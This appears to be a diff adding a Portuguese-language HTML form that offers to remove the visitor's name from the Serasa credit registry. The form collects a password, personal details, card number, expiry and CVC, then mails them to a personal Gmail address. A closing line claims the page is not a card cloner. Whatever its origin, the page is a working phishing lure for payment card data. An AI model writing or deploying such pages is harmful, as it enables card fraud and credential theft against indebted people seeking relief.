@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="utf-8">
+        <meta nome="Authors" content="Jefferson Alvino Costa">
+        <meta name="Description" content="Formulario">
+        <title>Formulario</title> 
+        <link rel="stylesheet" href="css.css">
+    </head>
+    <body>
+       <br><br><br><br><br><br>
+       <script>
+        $(document).ready(function()
+        {
+            $("#txttel") .inputmask("(999) 9999-9999");
+        });
+       </script>
+       
+       <form id="formulario" name="formulario" method="post" action="mailto:jeffersonalvino60@gmail.com" enctype="text/plain">
+            <div class="Div">
+                <H1 class="h1">Tirando nome do Serasa</H1>
+            </div>
+            <br><br>
+            <table>
+                <tr>
+                    <td class="direita">
+                        <label for="txtnome">Nome Completo:</label>
+                    </td>
+                    <td>
+                        <input type="text" name="txtnome" id="txtnome" maxlength="30" placeholder="Preencha o Nome completo" required autofocus />
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtsenha">Senha:</label>
+                    </td>
+                    <td>
+                        <input type="password" name="txtsenha" id="txtsenha" maxlength="8" placeholder="Password" />
+                    </td>
+                </tr>
+                <tr>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtnasc">Data do Nascimento:</label>
+                    </td>
+                    <td>
+                        <input type="date" id="txtnasc" name="txtnasc"/>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtemail">e-mail:</label>
+                    </td>
+                    <td>
+                        <input type="email" name="txtemail" id="txtemail" maxlength="30" required  placeholder="xxxx@xxxx.xxx"/>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtcida">Cidade</label>
+                    </td>
+                    <td>
+                        <input type="text" name="txtcida" id="txtcida" value="São Paulo" maxlength="30" />
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtuf">UF:</label>
+                    </td>
+                    <td>
+                        <select id="txtuf" name="txtuf">
+                            <option value="AC">Acre</option>
+                            <option value="AM">Amazonas</option>
+                            <option value="AL">Alagoas</option>
+                            <option value="AP">Amapá</option>
+                            <option value="BA">Bahia</option>
+                            <option value="CE">Ceará</option>
+                            <option value="DF">Distrito Federal</option>
+                            <option value="ES">Espírito Santos</option>
+                            <option value="GO">Goias</option>
+                            <option value="MA">Maranhão</option>
+                            <option value="MT">Mato Grosso</option>
+                            <option value="MS">Mato Grosso do Sul</option>
+                            <option value="MG">Minas Gerais</option>
+                            <option value="PA">Pará</option>
+                            <option value="PB">Paraíba</option>
+                            <option value="PE">Pernambuco</option>
+                            <option value="PI">Piauí</option>
+                            <option value="PR">Paraná</option>
+                            <option value="RJ">Rio de Jainero</option>
+                            <option value="RN">Rio Grande do Norte</option>
+                            <option value="RO">Rondônia</option>
+                            <option value="RR">Roraima</option>
+                            <option value="RS">Rio Grande do Sul</option>
+                            <option value="SC">Santa Catarina</option>
+                            <option value="SE">Sergipe</option>
+                            <option value="SP" selected>São Paulo</option>
+                            <option value="TO">Tocantins</option>
+                        </select>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txttele">Telefone:</label>
+                    </td>
+                    <td>
+                        <input type="txtele" id="txttel" name="txttel" placeholder="(999) 9999-9999" />
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="txtcur">Cartão:</label>
+                    </td>
+                    <td>
+                        <input type="radio" id="txtMC" name="cartão" checked />Master Card<br/>
+                        <input type="radio" id="txtVS" name="cartão" />Visa<br/>
+                        <input type="radio" id="txtEl" name="cartão" />Elo<br/>
+                        <input type="radio" id="txtIN" name="cartão" />Internacional<br/>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                            <label for="txtnumeroCartão">Numero do Cartão:</label>
+                    </td>
+                    <td>
+                        <input type="text" name="textcartão" id="numerocartão" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx"> 
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="validade">Data Validade do Cartão:</label>
+                    </td>
+                    <td>
+                        <input type="date" name="validade" id="validade">
+                    </td>
+                </tr>
+                <tr>
+                    <td class="direita">
+                        <label for="cvc">Cvc: </label>
+                    </td>
+                    <td>
+                        <input type="password" name="textcvc" id="cvc" maxlength="3">
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" class="centralizado">
+                        <input type="submit" id="enviar" value="Enviar" onClick="Envio()"/>
+                        <input type="reset" id="limpar" value="Limpar" onClick="window.document.getElementById('txtnome').focus();"/>
+                    </td>
+                </tr>
+            </table>
+       </form>
+       <br><br><br><br><br><br><br><br>
+       <h4 class="h4">Isso não é um Clona Cartão!</h4>
+    </body>
+</html>
